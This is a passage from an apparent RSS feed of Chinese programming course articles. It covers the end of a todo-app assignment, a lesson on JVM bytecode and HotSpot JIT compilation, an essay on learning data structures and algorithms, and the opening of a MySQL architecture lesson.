&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Todo 列表导入。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>todo import -f todolist
&lt;/code>&lt;/pre>&lt;h1 id="第四阶段支持数据库持久化">第四阶段：支持数据库持久化&lt;/h1>
&lt;p>在配置文件中，配置数据库连接信息。&lt;/p>
&lt;ul>
&lt;li>初始化数据库。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>todo init
&lt;/code>&lt;/pre>&lt;p>要求：&lt;/p>
&lt;ul>
&lt;li>没有数据库的情况下，使用本地文件；&lt;/li>
&lt;li>在有数据库的情况下，使用数据库；&lt;/li>
&lt;li>在本地文件已经存在的情况，将本地信息导入到数据库中。&lt;/li>
&lt;/ul>
&lt;p>以上我给出的是最基本的需求，你可以根据自己的实际编码情况，适当补充一些细节，比如，相应的错误提示。&lt;/p>
&lt;p>你可以用自己最熟悉的程序设计语言、按照自己最习惯的方式编写代码，并在 Github 上以公开仓库的方式提交自己的代码，将仓库链接贴在这节课的留言区下，我会顺着链接找到你的仓库，去查看你写的代码。&lt;/p>
&lt;p>为了方便代码的阅读，请你按如下要求编写你的代码：&lt;/p>
&lt;ul>
&lt;li>在项目的 README 文件中，写出如何构建和执行你的应用；&lt;/li>
&lt;li>需求分成四个阶段，请你按顺序依次完成每个阶段的需求；&lt;/li>
&lt;li>每完成一个阶段的代码，创建一个 tag，tag 名称分别为 todo-phase-1、todo-phase-2、todo-phase-3、todo-phase-4。&lt;/li>
&lt;/ul>
&lt;p>之所以要把需求分阶段，主要是方便大家参与，即便你时间有限，只写第一个阶段的代码，依然是一个完整的需求。学过《10x 程序员工作法》的同学都知道，任务分解是一个重要的工作原则，分阶段需求其实就是一种需求层面上的任务分解。&lt;/p>
&lt;p>在专栏结束之前，我会专门制作一期加餐，点评大家的代码；同时，我也会选出代码写的最整洁的 3 位同学，送出价值149 元的华为智能体脂电子称。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/5d/6b/5d6600a2769c6924d732d80eb365206b.jpg" alt="">&lt;/p>
&lt;p>欢迎加入这次编码的训练中，期待你在留言区分享你的代码。&lt;/p></description></item><item><title>极客专栏: 01丨Java代码是怎么运行的？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E6%8B%86%E8%A7%A3jvm%E8%99%9A%E6%8B%9F%E6%9C%BA/01%E4%B8%A8java%E4%BB%A3%E7%A0%81%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E7%9A%84/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E6%8B%86%E8%A7%A3jvm%E8%99%9A%E6%8B%9F%E6%9C%BA/01%E4%B8%A8java%E4%BB%A3%E7%A0%81%E6%98%AF%E6%80%8E%E4%B9%88%E8%BF%90%E8%A1%8C%E7%9A%84/</guid><description>
&lt;p>我们学院的一位教授之前去美国开会，入境的时候海关官员就问他：既然你会计算机，那你说说你用的都是什么语言吧？&lt;/p>
&lt;p>教授随口就答了个 Java。海关一看是懂行的，也就放行了，边敲章还边说他们上学那会学的是 C+。我还特意去查了下，真有叫 C+ 的语言，但是这里海关官员应该指的是 C++。&lt;/p>
&lt;p>事后教授告诉我们，他当时差点就问海关，是否知道 Java 和 C++ 在运行方式上的区别。但是又担心海关官员拿他的问题来考别人，也就没问出口。那么，下次你去美国，不幸地被海关官员问这个问题，你懂得如何回答吗？&lt;/p>
&lt;p>作为一名 Java 程序员，你应该知道，Java 代码有很多种不同的运行方式。比如说可以在开发工具中运行，可以双击执行 jar 文件运行，也可以在命令行中运行，甚至可以在网页中运行。当然，这些执行方式都离不开 JRE，也就是 Java 运行时环境。&lt;/p>
&lt;p>实际上，JRE 仅包含运行 Java 程序的必需组件，包括 Java 虚拟机以及 Java 核心类库等。我们 Java 程序员经常接触到的 JDK（Java 开发工具包）同样包含了 JRE，并且还附带了一系列开发、诊断工具。&lt;/p>
&lt;p>然而，运行 C++ 代码则无需额外的运行时。我们往往把这些代码直接编译成 CPU 所能理解的代码格式，也就是机器码。&lt;/p>
&lt;p>比如下图的中间列，就是用 C 语言写的 Helloworld 程序的编译结果。可以看到，C 程序编译而成的机器码就是一个个的字节，它们是给机器读的。那么为了让开发人员也能够理解，我们可以用反汇编器将其转换成汇编代码（如下图的最右列所示）。&lt;/p>
&lt;pre>&lt;code>; 最左列是偏移；中间列是给机器读的机器码；最右列是给人读的汇编代码
0x00: 55 push rbp
0x01: 48 89 e5 mov rbp,rsp
0x04: 48 83 ec 10 sub rsp,0x10
0x08: 48 8d 3d 3b 00 00 00 lea rdi,[rip+0x3b]
; 加载 &amp;quot;Hello, World!\n&amp;quot;
0x0f: c7 45 fc 00 00 00 00 mov DWORD PTR [rbp-0x4],0x0
0x16: b0 00 mov al,0x0
0x18: e8 0d 00 00 00 call 0x12
; 调用 printf 方法
0x1d: 31 c9 xor ecx,ecx
0x1f: 89 45 f8 mov DWORD PTR [rbp-0x8],eax
0x22: 89 c8 mov eax,ecx
0x24: 48 83 c4 10 add rsp,0x10
0x28: 5d pop rbp
0x29: c3 ret
&lt;/code>&lt;/pre>
&lt;p>既然 C++ 的运行方式如此成熟，那么你有没有想过，为什么 Java 要在虚拟机中运行呢，Java 虚拟机具体又是怎样运行 Java 代码的呢，它的运行效率又如何呢？&lt;/p>
&lt;p>今天我便从这几个问题入手，和你探讨一下，Java 执行系统的主流实现以及设计决策。&lt;/p>
&lt;h2 id="为什么-java-要在虚拟机里运行">为什么 Java 要在虚拟机里运行？&lt;/h2>
&lt;p>Java 作为一门高级程序语言，它的语法非常复杂，抽象程度也很高。因此，直接在硬件上运行这种复杂的程序并不现实。所以呢，在运行 Java 程序之前，我们需要对其进行一番转换。&lt;/p>
&lt;p>这个转换具体是怎么操作的呢？当前的主流思路是这样子的，设计一个面向 Java 语言特性的虚拟机，并通过编译器将 Java 程序转换成该虚拟机所能识别的指令序列，也称 Java 字节码。这里顺便说一句，之所以这么取名，是因为 Java 字节码指令的操作码（opcode）被固定为一个字节。&lt;/p>
&lt;p>举例来说，下图的中间列，正是用 Java 写的 Helloworld 程序编译而成的字节码。可以看到，它与 C 版本的编译结果一样，都是由一个个字节组成的。&lt;/p>
&lt;p>并且，我们同样可以将其反汇编为人类可读的代码格式（如下图的最右列所示）。不同的是，Java 版本的编译结果相对精简一些。这是因为 Java 虚拟机相对于物理机而言，抽象程度更高。&lt;/p>
&lt;pre>&lt;code># 最左列是偏移；中间列是给虚拟机读的机器码；最右列是给人读的代码
0x00: b2 00 02 getstatic java.lang.System.out
0x03: 12 03 ldc &amp;quot;Hello, World!&amp;quot;
0x05: b6 00 04 invokevirtual java.io.PrintStream.println
0x08: b1 return
&lt;/code>&lt;/pre>
&lt;p>Java 虚拟机可以由硬件实现 [1]，但更为常见的是在各个现有平台（如 Windows_x64、Linux_aarch64）上提供软件实现。这么做的意义在于，一旦一个程序被转换成 Java 字节码，那么它便可以在不同平台上的虚拟机实现里运行。这也就是我们经常说的&amp;quot;一次编写，到处运行&amp;quot;。&lt;/p>
&lt;p>虚拟机的另外一个好处是它带来了一个托管环境（Managed Runtime）。这个托管环境能够代替我们处理一些代码中冗长而且容易出错的部分。其中最广为人知的当属自动内存管理与垃圾回收，这部分内容甚至催生了一波垃圾回收调优的业务。&lt;/p>
&lt;p>除此之外，托管环境还提供了诸如数组越界、动态类型、安全权限等等的动态检测，使我们免于书写这些无关业务逻辑的代码。&lt;/p>
&lt;h2 id="java-虚拟机具体是怎样运行-java-字节码的">Java 虚拟机具体是怎样运行 Java 字节码的？&lt;/h2>
&lt;p>下面我将以标准 JDK 中的 HotSpot 虚拟机为例，从虚拟机以及底层硬件两个角度，给你讲一讲 Java 虚拟机具体是怎么运行 Java 字节码的。&lt;/p>
&lt;p>从虚拟机视角来看，执行 Java 代码首先需要将它编译而成的 class 文件加载到 Java 虚拟机中。加载后的 Java 类会被存放于方法区（Method Area）中。实际运行时，虚拟机会执行方法区内的代码。&lt;/p>
&lt;p>如果你熟悉 X86 的话，你会发现这和段式内存管理中的代码段类似。而且，Java 虚拟机同样也在内存中划分出堆和栈来存储运行时数据。&lt;/p>
&lt;p>不同的是，Java 虚拟机会将栈细分为面向 Java 方法的 Java 方法栈，面向本地方法（用 C++ 写的 native 方法）的本地方法栈，以及存放各个线程执行位置的 PC 寄存器。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/ab/77/ab5c3523af08e0bf2f689c1d6033ef77.png" alt="">&lt;/p>
&lt;p>在运行过程中，每当调用进入一个 Java 方法，Java 虚拟机会在当前线程的 Java 方法栈中生成一个栈帧，用以存放局部变量以及字节码的操作数。这个栈帧的大小是提前计算好的，而且 Java 虚拟机不要求栈帧在内存空间里连续分布。&lt;/p>
&lt;p>当退出当前执行的方法时，不管是正常返回还是异常返回，Java 虚拟机均会弹出当前线程的当前栈帧，并将之舍弃。&lt;/p>
&lt;p>从硬件视角来看，Java 字节码无法直接执行。因此，Java 虚拟机需要将字节码翻译成机器码。&lt;/p>
&lt;p>在 HotSpot 里面，上述翻译过程有两种形式：第一种是解释执行，即逐条将字节码翻译成机器码并执行；第二种是即时编译（Just-In-Time compilation，JIT），即将一个方法中包含的所有字节码编译成机器码后再执行。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/5e/3b/5ee351091464de78eed75438b6f9183b.png" alt="">&lt;/p>
&lt;p>前者的优势在于无需等待编译，而后者的优势在于实际运行速度更快。HotSpot 默认采用混合模式，综合了解释执行和即时编译两者的优点。它会先解释执行字节码，而后将其中反复执行的热点代码，以方法为单位进行即时编译。&lt;/p>
&lt;h2 id="java-虚拟机的运行效率究竟是怎么样的">Java 虚拟机的运行效率究竟是怎么样的？&lt;/h2>
&lt;p>HotSpot 采用了多种技术来提升启动性能以及峰值性能，刚刚提到的即时编译便是其中最重要的技术之一。&lt;/p>
&lt;p>即时编译建立在程序符合二八定律的假设上，也就是百分之二十的代码占据了百分之八十的计算资源。&lt;/p>
&lt;p>对于占据大部分的不常用的代码，我们无需耗费时间将其编译成机器码，而是采取解释执行的方式运行；另一方面，对于仅占据小部分的热点代码，我们则可以将其编译成机器码，以达到理想的运行速度。&lt;/p>
&lt;p>理论上讲，即时编译后的 Java 程序的执行效率，是可能超过 C++ 程序的。这是因为与静态编译相比，即时编译拥有程序的运行时信息，并且能够根据这个信息做出相应的优化。&lt;/p>
&lt;p>举个例子，我们知道虚方法是用来实现面向对象语言多态性的。对于一个虚方法调用，尽管它有很多个目标方法，但在实际运行过程中它可能只调用其中的一个。&lt;/p>
&lt;p>这个信息便可以被即时编译器所利用，来规避虚方法调用的开销，从而达到比静态编译的 C++ 程序更高的性能。&lt;/p>
&lt;p>为了满足不同用户场景的需要，HotSpot 内置了多个即时编译器：C1、C2 和 Graal。Graal 是 Java 10 正式引入的实验性即时编译器，在专栏的第四部分我会详细介绍，这里暂不做讨论。&lt;/p>
&lt;p>之所以引入多个即时编译器，是为了在编译时间和生成代码的执行效率之间进行取舍。C1 又叫做 Client 编译器，面向的是对启动性能有要求的客户端 GUI 程序，采用的优化手段相对简单，因此编译时间较短。&lt;/p>
&lt;p>C2 又叫做 Server 编译器，面向的是对峰值性能有要求的服务器端程序，采用的优化手段相对复杂，因此编译时间较长，但同时生成代码的执行效率较高。&lt;/p>
&lt;p>从 Java 7 开始，HotSpot 默认采用分层编译的方式：热点方法首先会被 C1 编译，而后热点方法中的热点会进一步被 C2 编译。&lt;/p>
&lt;p>为了不干扰应用的正常运行，HotSpot 的即时编译是放在额外的编译线程中进行的。HotSpot 会根据 CPU 的数量设置编译线程的数目，并且按 1:2 的比例配置给 C1 及 C2 编译器。&lt;/p>
&lt;p>在计算资源充足的情况下，字节码的解释执行和即时编译可同时进行。编译完成后的机器码会在下次调用该方法时启用，以替换原本的解释执行。&lt;/p>
&lt;h2 id="总结与实践">总结与实践&lt;/h2>
&lt;p>今天我简单介绍了 Java 代码为何在虚拟机中运行，以及如何在虚拟机中运行。&lt;/p>
&lt;p>之所以要在虚拟机中运行，是因为它提供了可移植性。一旦 Java 代码被编译为 Java 字节码，便可以在不同平台上的 Java 虚拟机实现上运行。此外，虚拟机还提供了一个代码托管的环境，代替我们处理部分冗长而且容易出错的事务，例如内存管理。&lt;/p>
&lt;p>Java 虚拟机将运行时内存区域划分为五个部分，分别为方法区、堆、PC 寄存器、Java 方法栈和本地方法栈。Java 程序编译而成的 class 文件，需要先加载至方法区中，方能在 Java 虚拟机中运行。&lt;/p>
&lt;p>为了提高运行效率，标准 JDK 中的 HotSpot 虚拟机采用的是一种混合执行的策略。&lt;/p>
&lt;p>它会解释执行 Java 字节码，然后会将其中反复执行的热点代码，以方法为单位进行即时编译，翻译成机器码后直接运行在底层硬件之上。&lt;/p>
&lt;p>HotSpot 装载了多个不同的即时编译器，以便在编译时间和生成代码的执行效率之间做取舍。&lt;/p>
&lt;p>下面我给你留一个小作业，通过观察两个条件判断语句的运行结果，来思考 Java 语言和 Java 虚拟机看待 boolean 类型的方式是否不同。&lt;/p>
&lt;p>下载 asmtools.jar [2] ，并在命令行中运行下述指令（不包含提示符 $）：&lt;/p>
&lt;pre>&lt;code>$ echo '
public class Foo {
public static void main(String[] args) {
boolean flag = true;
if (flag) System.out.println(&amp;quot;Hello, Java!&amp;quot;);
if (flag == true) System.out.println(&amp;quot;Hello, JVM!&amp;quot;);
}
}' &amp;gt; Foo.java
$ javac Foo.java
$ java Foo
$ java -cp /path/to/asmtools.jar org.openjdk.asmtools.jdis.Main Foo.class &amp;gt; Foo.jasm.1
$ awk 'NR==1,/iconst_1/{sub(/iconst_1/, &amp;quot;iconst_2&amp;quot;)} 1' Foo.jasm.1 &amp;gt; Foo.jasm
$ java -cp /path/to/asmtools.jar org.openjdk.asmtools.jasm.Main Foo.jasm
$ java Foo
&lt;/code>&lt;/pre>
&lt;p>[1] : &lt;a href="https://en.wikipedia.org/wiki/Java_processor">https://en.wikipedia.org/wiki/Java_processor&lt;/a>&lt;br>
[2]: &lt;a href="https://wiki.openjdk.java.net/display/CodeTools/asmtools">https://wiki.openjdk.java.net/display/CodeTools/asmtools&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/2a/d5/2a62e58cbdf56a5dc40748567d346fd5.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 01丨为什么要学习数据结构和算法？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/01%E4%B8%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/01%E4%B8%A8%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/</guid><description>
&lt;p>你是不是觉得数据结构和算法，跟操作系统、计算机网络一样，是脱离实际工作的知识？可能除了面试，这辈子也用不着？&lt;/p>
&lt;p>尽管计算机相关专业的同学在大学都学过这门课程，甚至很多培训机构也会培训这方面的知识，但是据我了解，很多程序员对数据结构和算法依旧一窍不通。还有一些人也只听说过数组、链表、快排这些最最基本的数据结构和算法，稍微复杂一点的就完全没概念。&lt;/p>
&lt;p>当然，也有很多人说，自己实际工作中根本用不到数据结构和算法。所以，就算不懂这块知识，只要 Java API、开发框架用得熟练，照样可以把代码写得&amp;quot;飞&amp;quot;起来。事实真的是这样吗？&lt;/p>
&lt;p>今天我们就来详细聊一聊，为什么要学习数据结构和算法。&lt;/p>
&lt;h2 id="想要通关大厂面试千万别让数据结构和算法拖了后腿">想要通关大厂面试，千万别让数据结构和算法拖了后腿&lt;/h2>
&lt;p>很多大公司，比如 BAT、Google、Facebook，面试的时候都喜欢考算法、让人现场写代码。有些人虽然技术不错，但每次去面试都会&amp;quot;跪&amp;quot;在算法上，很是可惜。那你有没有想过，为什么这些大公司都喜欢考算法呢？&lt;/p>
&lt;p>校招的时候，参加面试的学生通常没有实际项目经验，公司只能考察他们的基础知识是否牢固。社招就更不用说了，越是厉害的公司，越是注重考察数据结构与算法这类基础知识。相比短期能力，他们更看中你的长期潜力。&lt;/p>
&lt;p>你可能要说了，我不懂数据结构与算法，照样找到了好工作啊。那我是不是就不用学数据结构和算法呢？当然不是，你别忘了，&lt;strong>我们学任何知识都是为了&amp;quot;用&amp;quot;的，是为了解决实际工作问题的&lt;/strong>，学习数据结构和算法自然也不例外。&lt;/p>
&lt;h2 id="业务开发工程师你真的愿意做一辈子-crud-boy-吗">业务开发工程师，你真的愿意做一辈子 CRUD boy 吗？&lt;/h2>
&lt;p>如果你是一名业务开发工程师，你可能要说，我整天就是做数据库 CRUD（增删改查），哪里用得到数据结构和算法啊？&lt;/p>
&lt;p>是的，对于大部分业务开发来说，我们平时可能更多的是利用已经封装好的现成的接口、类库来堆砌、翻译业务逻辑，很少需要自己实现数据结构和算法。但是，&lt;strong>不需要自己实现，并不代表什么都不需要了解&lt;/strong>。&lt;/p>
&lt;p>如果不知道这些类库背后的原理，不懂得时间、空间复杂度分析，你如何能用好、用对它们？存储某个业务数据的时候，你如何知道应该用 ArrayList，还是 Linked List 呢？调用了某个函数之后，你又该如何评估代码的性能和资源的消耗呢？&lt;/p>
&lt;p>作为业务开发，我们会用到各种框架、中间件和底层系统，比如 Spring、RPC 框架、消息中间件、Redis 等等。&lt;strong>在这些基础框架中，一般都揉和了很多基础数据结构和算法的设计思想。&lt;/strong>&lt;/p>
&lt;p>比如，我们常用的 Key-Value 数据库 Redis 中，里面的有序集合是用什么数据结构来实现的呢？为什么要用跳表来实现呢？为什么不用二叉树呢？&lt;/p>
&lt;p>如果你能弄明白这些底层原理，你就能更好地使用它们。即便出现问题，也很容易就能定位。因此，&lt;strong>掌握数据结构和算法，不管对于阅读框架源码，还是理解其背后的设计思想，都是非常有用的。&lt;/strong>&lt;/p>
&lt;p>在平时的工作中，数据结构和算法的应用到处可见。我来举一个你非常熟悉的例子：如何实时地统计业务接口的 99% 响应时间？&lt;/p>
&lt;p>你可能最先想到，每次查询时，从小到大排序所有的响应时间，如果总共有 1200 个数据，那第 1188 个数据就是 99% 的响应时间。很显然，每次用这个方法查询的话都要排序，效率是非常低的。但是，如果你知道&amp;quot;堆&amp;quot;这个数据结构，用两个堆可以非常高效地解决这个问题。&lt;/p>
&lt;h2 id="基础架构研发工程师写出达到开源水平的框架才是你的目标">基础架构研发工程师，写出达到开源水平的框架才是你的目标！&lt;/h2>
&lt;p>现在互联网上的技术文章、架构分享、开源项目满天飞，照猫画虎做一套基础框架并不难。我就拿 RPC 框架举例。&lt;/p>
&lt;p>不同的公司、不同的人做出的 RPC 框架，架构设计思路都差不多，最后实现的功能也都差不多。但是有的人做出来的框架，Bug 很多、性能一般、扩展性也不好，只能在自己公司仅有的几个项目里面用一下。而有的人做的框架可以开源到 GitHub 上给很多人用，甚至被 Apache 收录。为什么会有这么大的差距呢？&lt;/p>
&lt;p>我觉得，高手之间的竞争其实就在细节。这些细节包括：你用的算法是不是够优化，数据存取的效率是不是够高，内存是不是够节省等等。这些累积起来，决定了一个框架是不是优秀。所以，如果你还不懂数据结构和算法，没听说过大 O 复杂度分析，不知道怎么分析代码的时间复杂度和空间复杂度，那肯定说不过去了，赶紧来补一补吧！&lt;/p>
&lt;h2 id="对编程还有追求不想被行业淘汰那就不要只会写凑合能用的代码">对编程还有追求？不想被行业淘汰？那就不要只会写凑合能用的代码！&lt;/h2>
&lt;p>何为编程能力强？是代码的可读性好、健壮？还是扩展性好？我觉得没法列，也列不全。但是，在我看来，&lt;strong>性能好坏起码是其中一个非常重要的评判标准&lt;/strong>。但是，如果你连代码的时间复杂度、空间复杂度都不知道怎么分析，怎么写出高性能的代码呢？&lt;/p>
&lt;p>你可能会说，我在小公司工作，用户量很少，需要处理的数据量也很少，开发中不需要考虑那么多性能的问题，完成功能就可以，用什么数据结构和算法，差别根本不大。但是你真的想&amp;quot;十年如一日&amp;quot;地做一样的工作吗？&lt;/p>
&lt;p>经常有人说，程序员 35 岁之后很容易陷入瓶颈，被行业淘汰，我觉得原因其实就在此。有的人写代码的时候，从来都不考虑非功能性的需求，只是完成功能，凑合能用就好；做事情的时候，也从来没有长远规划，只把眼前事情做好就满足了。&lt;/p>
&lt;p>我曾经面试过很多大龄候选人，简历能写十几页，经历的项目有几十个，但是细看下来，每个项目都是重复地堆砌业务逻辑而已，完全没有难度递进，看不出有能力提升。久而久之，十年的积累可能跟一年的积累没有任何区别。这样的人，怎么不会被行业淘汰呢？&lt;/p>
&lt;p>如果你在一家成熟的公司，或者 BAT 这样的大公司，面对的是千万级甚至亿级的用户，开发的是 TB、PB 级别数据的处理系统。性能几乎是开发过程中时刻都要考虑的问题。一个简单的 ArrayList、Linked List 的选择问题，就可能会产生成千上万倍的性能差别。这个时候，数据结构和算法的意义就完全凸显出来了。&lt;/p>
&lt;p>其实，我觉得，数据结构和算法这个东西，如果你不去学，可能真的这辈子都用不到，也感受不到它的好。但是一旦掌握，你就会常常被它的强大威力所折服。之前你可能需要费很大劲儿来优化的代码，需要花很多心思来设计的架构，用了数据结构和算法之后，很容易就可以解决了。&lt;/p>
&lt;h2 id="内容小结">内容小结&lt;/h2>
&lt;p>我们学习数据结构和算法，并不是为了死记硬背几个知识点。我们的目的是建立时间复杂度、空间复杂度意识，写出高质量的代码，能够设计基础架构，提升编程技能，训练逻辑思维，积攒人生经验，以此获得工作回报，实现你的价值，完善你的人生。&lt;/p>
&lt;p>所以，不管你是业务开发工程师，还是基础架构工程师；不管你是初入职场的初级工程师，还是工作多年的资深架构师，又或者是想转人工智能、区块链这些热门领域的程序员，数据结构与算法作为计算机的基础知识、核心知识，都是必须要掌握的。&lt;/p>
&lt;p>&lt;strong>掌握了数据结构与算法，你看待问题的深度，解决问题的角度就会完全不一样&lt;/strong>。因为这样的你，就像是站在巨人的肩膀上，拿着生存利器行走世界。数据结构与算法，会为你的编程之路，甚至人生之路打开一扇通往新世界的大门。&lt;/p>
&lt;h2 id="课后思考">课后思考&lt;/h2>
&lt;p>你为什么要学习数据结构和算法呢？在过去的软件开发中，数据结构和算法在哪些地方帮到了你？&lt;/p>
&lt;p>欢迎留言和我分享，我会第一时间给你反馈。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/8e/d3/8e603e3d795fc0ab2698f6f5eabf14d3.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 01丨基础架构：一条SQL查询语句是如何执行的？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/mysql-%E5%AE%9E%E6%88%98-45-%E8%AE%B2/01%E4%B8%A8%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E4%B8%80%E6%9D%A1sql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E6%98%AF%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E7%9A%84/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/mysql-%E5%AE%9E%E6%88%98-45-%E8%AE%B2/01%E4%B8%A8%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E4%B8%80%E6%9D%A1sql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E6%98%AF%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E7%9A%84/</guid><description>
&lt;p>你好，我是林晓斌。&lt;/p>
&lt;p>这是专栏的第一篇文章，我想来跟你聊聊 MySQL 的基础架构。我们经常说，看一个事儿千万不要直接陷入细节里，你应该先鸟瞰其全貌，这样能够帮助你从高维度理解问题。同样，对于 MySQL 的学习也是这样。平时我们使用数据库，看到的通常都是一个整体。比如，你有个最简单的表，表里只有一个 ID 字段，在执行下面这个查询语句时：&lt;/p>
&lt;pre>&lt;code>mysql&amp;gt; select * from T where ID=10；
&lt;/code>&lt;/pre>
&lt;p>我们看到的只是输入一条语句，返回一个结果，却不知道这条语句在 MySQL 内部的执行过程。&lt;/p>
&lt;p>所以今天我想和你一起把 MySQL 拆解一下，看看里面都有哪些&amp;quot;零件&amp;quot;，希望借由这个拆解过程，让你对 MySQL 有更深入的理解。这样当我们碰到 MySQL 的一些异常或者问题时，就能够直戳本质，更为快速地定位并解决问题。&lt;/p>
&lt;p>下面我给出的是 MySQL 的基本架构示意图，从中你可以清楚地看到 SQL 语句在 MySQL 的各个功能模块中的执行过程。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/0d/d9/0d2070e8f84c4801adbfa03bda1f98d9.png" alt="">
MySQL 的逻辑架构图&lt;/p>
&lt;p>大体来说，MySQL 可以分为 Server 层和存储引擎层两部分。&lt;/p>
&lt;p>Server 层包括连接器、查询缓存、分析器、优化器、执行器等，涵盖 MySQL 的大多数核心服务功能，以及所有的内置函数（如日期、时间、数学和加密函数等），所有跨存储引擎的功能都在这一层实现，比如存储过程、触发器、视图等。&lt;/p>
&lt;p>而存储引擎层负责数据的存储和提取。其架构模式是插件式的，支持 InnoDB、MyISAM、Memory 等多个存储引擎。现在最常用的存储引擎是 InnoDB，它从 MySQL 5.5.5 版本开始成为了默认存储引擎。&lt;/p>
&lt;p>也就是说，你执行 create table 建表的时候，如果不指定引擎类型，默认使用的就是 InnoDB。不过，你也可以通过指定存储引擎的类型来选择别的引擎，比如在 create table 语句中使用 engine=memory, 来指定使用内存引擎创建表。不同存储引擎的表数据存取方式不同，支持的功能也不同，在后面的文章中，我们会讨论到引擎的选择。&lt;/p>
&lt;p>从图中不难看出，不同的存储引擎共用一个&lt;strong>Server 层&lt;/strong>，也就是从连接器到执行器的部分。你可以先对每个组件的名字有个印象，接下来我会结合开头提到的那条 SQL 语句，带你走一遍整个执行流程，依次看下每个组件的作用。&lt;/p>
&lt;h1 id="连接器">连接器&lt;/h1>
&lt;p>第一步，你会先连接到这个数据库上，这时候接待你的就是连接器。连接器负责跟客户端建立连接、获取权限、维持和管理连接。连接命令一般是这么写的：&lt;/p>
&lt;pre>&lt;code>mysql -h$ip -P$port -u$user -p
&lt;/code>&lt;/pre>
&lt;p>输完命令之后，你就需要在交互对话里面输入密码。虽然密码也可以直接跟在 -p 后面写在命令行中，但这样可能会导致你的密码泄露。如果你连的是生产服务器，强烈建议你不要这么做。&lt;/p>
&lt;p>连接命令中的 mysql 是客户端工具，用来跟服务端建立连接。在完成经典的 TCP 握手后，连接器就要开始认证你的身份，这个时候用的就是你输入的用户名和密码。&lt;/p>
&lt;ul>
&lt;li>如果用户名或密码不对，你就会收到一个&amp;quot;Access denied for user&amp;quot;的错误，然后客户端程序结束执行。&lt;/li>
&lt;li>如果用户名密码认证通过，连接器会到权限表里面查出你拥有的权限。之后，这个连接里面的权限判断逻辑，都将依赖于此时读到的权限。&lt;/li>
&lt;/ul>
&lt;p>这就意味着，一个用户成功建立连接后，即使你用管理员账号对这个用户的权限做了修改，也不会影响已经存在连接的权限。修改完成后，只有再新建的连接才会使用新的权限设置。&lt;/p>
&lt;p>连接完成后，如果你没有后续的动作，这个连接就处于空闲状态，你可以在 show processlist 命令中看到它。文本中这个图是 show processlist 的结果，其中的 Command 列显示为&amp;quot;Sleep&amp;quot;的这一行，就表示现在系统里面有一个空闲连接。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/f2/ed/f2da4aa3a672d48ec05df97b9f992fed.png" alt="">&lt;br>
客户端如果太长时间没动静，连接器就会自动将它断开。这个时间是由参数 wait_timeout 控制的，默认值是 8 小时。&lt;/p>
&lt;p>如果在连接被断开之后，客户端再次发送请求的话，就会收到一个错误提醒： Lost connection to MySQL server during query。这时候如果你要继续，就需要重连，然后再执行请求了。&lt;/p>
&lt;p>数据库里面，长连接是指连接成功后，如果客户端持续有请求，则一直使用同一个连接。短连接则是指每次执行完很少的几次查询就断开连接，下次查询再重新建立一个。&lt;/p>
&lt;p>建立连接的过程通常是比较复杂的，所以我建议你在使用中要尽量减少建立连接的动作，也就是尽量使用长连接。&lt;/p>
&lt;p>但是全部使用长连接后，你可能会发现，有些时候 MySQL 占用内存涨得特别快，这是因为 MySQL 在执行过程中临时使用的内存是管理在连接对象里面的。这些资源会在连接断开的时候才释放。所以如果长连接累积下来，可能导致内存占用太大，被系统强行杀掉（OOM），从现象看就是 MySQL 异常重启了。&lt;/p>
&lt;p>怎么解决这个问题呢？你可以考虑以下两种方案。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>定期断开长连接。使用一段时间，或者程序里面判断执行过一个占用内存的大查询后，断开连接，之后要查询再重连。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果你用的是 MySQL 5.7 或更新版本，可以在每次执行一个比较大的操作后，通过执行 mysql_reset_connection 来重新初始化连接资源。这个过程不需要重连和重新做权限验证，但是会将连接恢复到刚刚创建完时的状态。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="查询缓存">查询缓存&lt;/h1>
